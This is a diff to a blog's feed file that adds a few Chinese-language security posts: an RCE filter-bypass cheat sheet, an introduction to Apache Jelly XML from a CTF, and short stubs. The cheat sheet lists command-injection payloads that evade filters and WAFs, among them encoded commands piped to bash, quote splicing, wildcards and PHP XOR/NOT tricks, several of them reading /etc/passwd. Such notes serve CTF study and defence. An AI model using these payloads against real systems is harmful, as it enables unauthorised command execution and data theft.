@@ -4,6 +4,94 @@
   
   
   <entry>
+    <title>day01</title>
+    <link href="/2025/01/02/day01/"/>
+    <url>/2025/01/02/day01/</url>
+    
+    <content type="html"><![CDATA[<h1 id="新刊blog，堂堂连载"><a href="#新刊blog，堂堂连载" class="headerlink" title="新刊blog，堂堂连载"></a>新刊blog，堂堂连载</h1>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>rce绕过总结</title>
+    <link href="/2024/12/11/rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
+    <url>/2024/12/11/rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
+    
+    <content type="html"><![CDATA[<h1 id="rce绕过总结"><a href="#rce绕过总结" class="headerlink" title="rce绕过总结"></a>rce绕过总结</h1><h2 id="空格绕过："><a href="#空格绕过：" class="headerlink" title="空格绕过："></a>空格绕过：</h2><p>在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,&#x2F;etc&#x2F;passwd} ）、%20(space)、%09(tab)</p><h2 id="命令执行函数system-绕过"><a href="#命令执行函数system-绕过" class="headerlink" title="命令执行函数system()绕过"></a>命令执行函数system()绕过</h2><p>系统命令函数system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号（·） 同shell_exec()用以上函数都可进行绕过。</p><h2 id="命令链接符："><a href="#命令链接符：" class="headerlink" title="命令链接符："></a>命令链接符：</h2><p>Windows和Linux都支持的命令连接符：<br>cmd1 | cmd2 只执行cmd2<br>cmd1 || cmd2 只有当cmd1执行失败后，cmd2才被执行<br>cmd1 &amp; cmd2 先执行cmd1，不管是否成功，都会执行cmd2<br>cmd1 &amp;&amp; cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2<br>Linux还支持分号（;），cmd1;cmd2 按顺序依次执行，先执行cmd1再执行cmd2  </p><h2 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>普通的正则只会匹配一次，所以我们可以双写绕过。pphphp，只会过滤掉中间的php剩下来的部分可以组成第二个php，phpphpinfoinfo，同理。</p><h3 id="利用变量绕过"><a href="#利用变量绕过" class="headerlink" title="利用变量绕过"></a>利用变量绕过</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;<br>$a$b$c &#x2F;etc&#x2F;passwd</p><h3 id="利用base编码绕过"><a href="#利用base编码绕过" class="headerlink" title="利用base编码绕过"></a>利用base编码绕过</h3><p>echo ‘cat’ | base64<br>Y2F0wqAK<br><code>echo &#39;Y2F0wqAK&#39; | base64 -d</code> &#x2F;etc&#x2F;passwd<br>echo ‘Y2F0IC9ldGMvcGFzc3dk’ | base64 -d | bash  &#x2F;&#x2F;   cat &#x2F;etc&#x2F;passwd </p><h3 id="利用hex编码绕过"><a href="#利用hex编码绕过" class="headerlink" title="利用hex编码绕过"></a>利用hex编码绕过</h3><p>echo “636174202F6574632F706173737764” | xxd -r -p|bash &#x2F;&#x2F; hex编码后的0x不需要输入</p><h3 id="利用oct编码（八进制）绕过"><a href="#利用oct编码（八进制）绕过" class="headerlink" title="利用oct编码（八进制）绕过"></a>利用oct编码（八进制）绕过</h3><p>$(printf “\154\163”)  &#x2F;&#x2F;ls命令</p><h3 id="利用16进制编码绕过"><a href="#利用16进制编码绕过" class="headerlink" title="利用16进制编码绕过"></a>利用16进制编码绕过</h3><p>“\x73\x79\x73\x74\x65\x6d”(“cat &#x2F;etc&#x2F;passwd”)</p><h3 id="利用拼接绕过"><a href="#利用拼接绕过" class="headerlink" title="利用拼接绕过"></a>利用拼接绕过</h3><p>(sy.(st).em)(whoami);&#x2F;&#x2F;<br>c’’a’’t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;单引<br>c””a””t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;双引<br>c<code>a</code>t &#x2F;etc&#x2F;passwd&#x2F;反单引<br>c\a\t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;反斜线<br>$*和$@，$x(x 代表 1-9),${x}(x&gt;&#x3D;10) :<br>比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:<br>wh$1oami<br>who$@ami<br>whoa$*mi<br>666<code>whoami</code>666 &#x2F;&#x2F;bash: 666root666: command not found<br>666<code>\whoami</code>666 &#x2F;&#x2F;bash: 666root666: command not found<br>&#x2F;&#x2F;命令执行后的结果在2个666中间  </p><h3 id="插入注释"><a href="#插入注释" class="headerlink" title="插入注释"></a>插入注释</h3><p>（这对于绕过阻止特定PHP函数名称的WAF规则集很有用）</p><p>system&#x2F;<em>A10ng_</em>&#x2F;(whoami);<br>system&#x2F;<em>A10ng_</em>&#x2F;(wh.&#x2F;<em>A10ng_</em>&#x2F;(oa)&#x2F;<em>caixukun</em>&#x2F;.mi);<br>(sy.&#x2F;<em>A10ng_</em>&#x2F;(st)&#x2F;<em>A10ng_</em>&#x2F;.em)&#x2F;<em>A10ng_</em>&#x2F;(wh.&#x2F;<em>A10ng_</em>&#x2F;(oa)&#x2F;<em>A10ng_</em>&#x2F;.mi);</p><h3 id="利用未初始化变量"><a href="#利用未初始化变量" class="headerlink" title="利用未初始化变量"></a>利用未初始化变量</h3><p>cat$u &#x2F;etc&#x2F;passwd<br>cat &#x2F;etc$u&#x2F;passwd</p><h3 id="过滤了斜杠’-‘"><a href="#过滤了斜杠’-‘" class="headerlink" title="过滤了斜杠’&#x2F;‘"></a>过滤了斜杠’&#x2F;‘</h3><p>可利用’;’拼接命令绕过<br>cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd</p><h3 id="利用通配符绕过"><a href="#利用通配符绕过" class="headerlink" title="利用通配符绕过"></a>利用通配符绕过</h3><p>cat &#x2F;passwd：<br>??? &#x2F;e??&#x2F;?a????</p><h3 id="利用path绕过"><a href="#利用path绕过" class="headerlink" title="利用path绕过"></a>利用path绕过</h3><p>可以通过截断和拼接来得到我们想要的来getshell<br>${PATH:5:1} &#x2F;&#x2F;l<br>${PATH:2:1} &#x2F;&#x2F;s<br>${PATH:5:1}${PATH:2:1} &#x2F;&#x2F;拼接后是ls,执行命令<br>${PATH:5:1}s &#x2F;&#x2F;拼接后是ls,执行命令  </p><h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):<br>            result=i^j<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i)+<span class="hljs-string">&#x27;  ^  &#x27;</span>+<span class="hljs-built_in">chr</span>(j)+<span class="hljs-string">&#x27; == &gt;  &#x27;</span>+<span class="hljs-built_in">chr</span>(result)+<span class="hljs-string">&quot; ASCII:&quot;</span>+<span class="hljs-built_in">str</span>(result))<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    xor()<br></code></pre></td></tr></table></figure><p>(‘GGGGGGG’^’7&#x2F;7.)!(‘)();<br>其中’G’^’7’&#x3D;p，’G’^’&#x2F;‘&#x3D;h…………依次类推拼出你想得到的令。</p><h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>例如phpinfo()就是：<br>(~’%8F%97%8F%96%91%99%90’)();</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>web中可执行的xml文件jelly</title>
+    <link href="/2024/12/11/web%E4%B8%AD%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84xml%E6%96%87%E4%BB%B6jelly/"/>
+    <url>/2024/12/11/web%E4%B8%AD%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84xml%E6%96%87%E4%BB%B6jelly/</url>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>好久没有写东西了，最近的ctf中有遇到一个jelly的题目，记录一下，题目是国成杯的web题，题目描述如下：</p><h2 id="Jelly简介"><a href="#Jelly简介" class="headerlink" title="Jelly简介"></a>Jelly简介</h2><p><a href="https://commons.apache.org/proper/commons-jelly/">Jelly的官方介绍</a></p><p>Jelly是Java Server Pages XML的简称，它是一种基于XML的脚本语言，用于在Java EE应用程序中生成动态内容。Jelly是一种基于XML的脚本语言，它允许开发人员使用XML标记来编写Java代码，从而实现动态内容的生成。</p><p>Jelly脚本通常包含在JSP文件中，通过在JSP文件中使用特殊的XML标记来执行Java代码。这些标记被称为Jelly标签，它们可以用于执行Java代码、访问Java对象、处理请求和响应等操作。</p><h2 id="如何实现并工作的"><a href="#如何实现并工作的" class="headerlink" title="如何实现并工作的"></a>如何实现并工作的</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">document</span> <span class="hljs-attr">time</span>=<span class="hljs-string">&quot;$&#123;now&#125;&quot;</span>&gt;</span><br>  Welcome $&#123;user.name&#125; to Jelly!<br><span class="hljs-tag">&lt;/<span class="hljs-name">document</span>&gt;</span><br></code></pre></td></tr></table></figure><p>原本有的脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTask</span> &#123;<br><br>    <span class="hljs-comment">// &#x27;doIt&#x27; method that does some function/task...</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SomeException &#123;<br>        <span class="hljs-comment">// do something...</span><br>    &#125;<br><br>    <span class="hljs-comment">// Properties, can be any type</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setX</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>        <span class="hljs-built_in">this</span>.x = x;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setY</span><span class="hljs-params">(String y)</span> &#123;<br>        <span class="hljs-built_in">this</span>.y = y;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用脚本的jelly文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">j:jelly</span> <span class="hljs-attr">xmlns:j</span>=<span class="hljs-string">&quot;jelly:core&quot;</span> <span class="hljs-attr">xmlns:define</span>=<span class="hljs-string">&quot;jelly:define&quot;</span> <span class="hljs-attr">xmlns:my</span>=<span class="hljs-string">&quot;myTagLib&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">define:taglib</span> <span class="hljs-attr">uri</span>=<span class="hljs-string">&quot;myTagLib&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">define:jellybean</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;foo&quot;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;MyTask&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">define:taglib</span>&gt;</span><br><br>  Now lets use the new tag<br>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">my:foo</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;cheese&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">j:jelly</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="继承功能"><a href="#继承功能" class="headerlink" title="继承功能"></a>继承功能</h2><p>jelly继承了JSTL，Ant，XML和Web_Service等，可以执行很多功能</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>国成杯回顾</title>
+    <link href="/2024/12/11/%E5%9B%BD%E6%88%90%E6%9D%AF%E5%9B%9E%E9%A1%BE/"/>
+    <url>/2024/12/11/%E5%9B%BD%E6%88%90%E6%9D%AF%E5%9B%9E%E9%A1%BE/</url>
+    
+    <content type="html"><![CDATA[<h1 id="国成杯回顾"><a href="#国成杯回顾" class="headerlink" title="国成杯回顾"></a>国成杯回顾</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Easy-Jelly"><a href="#Easy-Jelly" class="headerlink" title="Easy Jelly"></a>Easy Jelly</h3><p>考点：Jell XML引擎解析</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>DC-9</title>
     <link href="/2024/12/11/DC-9/"/>
     <url>/2024/12/11/DC-9/</url>
